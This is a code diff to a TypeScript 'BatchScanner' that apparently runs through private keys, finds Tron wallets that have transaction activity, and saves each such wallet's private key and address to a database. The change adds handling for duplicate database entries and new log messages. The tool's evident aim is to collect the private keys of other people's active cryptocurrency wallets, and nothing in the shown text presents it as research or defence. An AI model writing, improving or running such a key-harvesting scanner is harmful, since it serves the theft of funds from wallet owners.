@@ -340,17 +340,28 @@ export class BatchScanner {
           const hasTransactions = transactions.length >= this.MIN_ACTIVITY_THRESHOLD;
 
           if (hasTransactions) {
-            // Save to database
-            await storage.saveWalletRecord({
-              privateKey,
-              address,
-              trxBalance: "0",
-              trxBalanceUsd: "0",
-              tokensCount: 0,
-              totalBalanceUsd: "0",
-            });
+            // Try to save to database (handle duplicates gracefully)
+            try {
+              await storage.saveWalletRecord({
+                privateKey,
+                address,
+                trxBalance: "0",
+                trxBalanceUsd: "0",
+                tokensCount: 0,
+                totalBalanceUsd: "0",
+              });
+              console.log(`✅ Saved new active wallet: ${address} (${transactions.length} transactions)`);
+            } catch (error) {
+              if (error.code === '23505') {
+                // Duplicate address - wallet already exists, this is OK
+                console.log(`✅ Found active wallet (already in DB): ${address} (${transactions.length} transactions)`);
+              } else {
+                console.error(`❌ Error saving wallet ${address}:`, error.message);
+                throw error; // Re-throw non-duplicate errors
+              }
+            }
 
-            // Add to session atomically
+            // Always count found wallets, even if already in database
             await this.atomicAddWallet(sessionId, {
               address,
               privateKey,
@@ -358,7 +369,7 @@ export class BatchScanner {
               totalBalanceUsd: 0,
             });
 
-            console.log(`✅ Found active wallet: ${address} (${transactions.length} transactions)`);
+            console.log(`🎯 ACTIVE WALLET DETECTED: ${address} (${transactions.length} transactions)`);
           }
 
           // Progress update every 50 keys
@@ -473,17 +484,28 @@ export class BatchScanner {
         const hasTransactions = transactions.length >= this.MIN_ACTIVITY_THRESHOLD;
 
         if (hasTransactions) {
-          // Save active wallet to database (minimal data)
-          await storage.saveWalletRecord({
-            privateKey,
-            address: address,
-            trxBalance: "0", // We don't query balance anymore
-            trxBalanceUsd: "0",
-            tokensCount: 0,
-            totalBalanceUsd: "0",
-          });
+          // Try to save active wallet to database (handle duplicates gracefully)
+          try {
+            await storage.saveWalletRecord({
+              privateKey,
+              address: address,
+              trxBalance: "0", // We don't query balance anymore
+              trxBalanceUsd: "0",
+              tokensCount: 0,
+              totalBalanceUsd: "0",
+            });
+            console.log(`✅ Saved new active wallet: ${address} (${transactions.length} transactions)`);
+          } catch (error) {
+            if (error.code === '23505') {
+              // Duplicate address - wallet already exists, this is OK
+              console.log(`✅ Found active wallet (already in DB): ${address} (${transactions.length} transactions)`);
+            } else {
+              console.error(`❌ Error saving wallet ${address}:`, error.message);
+              throw error; // Re-throw non-duplicate errors
+            }
+          }
 
-          // Atomic add wallet operation
+          // Always count found wallets, even if already in database
           await this.atomicAddWallet(sessionId, {
             address: address,
             privateKey,
@@ -491,7 +513,7 @@ export class BatchScanner {
             totalBalanceUsd: 0,
           });
 
-          console.log(`Found active wallet: ${address} (${transactions.length} transactions)`);
+          console.log(`🎯 ACTIVE WALLET DETECTED: ${address} (${transactions.length} transactions)`);
         }
 
       } catch (error) {
